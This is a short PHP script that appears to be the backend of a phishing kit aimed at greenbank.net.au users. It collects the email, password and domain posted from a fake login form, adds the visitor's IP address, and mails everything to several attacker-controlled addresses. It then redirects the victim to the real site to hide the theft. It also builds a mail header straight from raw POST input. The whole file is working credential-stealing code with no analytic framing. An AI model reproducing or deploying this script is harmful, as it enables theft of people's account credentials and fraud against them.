   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ greenbank.net.au +-----------connect---\n";
$message .= "username: ".$_POST['Email']."\n";
$message .= "password: ".$_POST['Password']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By EMMA-----------------\n";
$send = "suretools21@hotmail.com,spamtools23@zoho.com,suretools21@yahoo.com,s.tols@aol.com,spambox2@writeme.com,spamtools33@gmail.com";
$subject = "ecn.net.au";
$headers = "From: obinna<logs@www.greenbank.net.au>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://www.greenbank.net.au/");
	  

?>